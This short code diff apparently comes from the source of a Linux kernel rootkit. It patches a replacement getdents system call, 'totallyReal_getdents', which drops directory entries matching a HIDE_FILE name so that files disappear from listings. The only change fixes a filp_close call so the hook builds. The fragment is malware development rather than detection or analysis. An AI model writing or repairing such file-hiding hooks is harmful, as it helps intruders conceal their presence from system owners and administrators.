@@ -147,7 +147,9 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		f = file_open( filename, O_RDONLY, 0 );
 		if (f != NULL)
 			pr_info("FAKEGETDENTS: File open success");
-		filp_close(f);
+		filp_close(f, NULL);
+
+
 		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
 			if (p_dirp == mod_dirp) {
 				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
